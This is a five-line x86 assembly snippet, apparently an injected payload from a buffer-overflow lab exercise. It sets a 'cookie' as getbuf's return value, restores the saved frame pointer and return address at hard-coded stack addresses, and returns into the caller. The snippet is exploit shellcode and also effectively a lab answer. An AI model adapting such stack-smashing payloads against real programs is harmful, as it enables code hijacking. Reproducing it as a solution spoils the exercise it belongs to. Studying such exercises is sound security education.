	movl $0x35c5d934, %eax #cookie is return value of getbuf
	movl $0x55683410 , %ebp #restore ebp
	movl $0x08048dca, 0x55683414 #restore ebp+4
	push $0x08048bfa	#push return address
	ret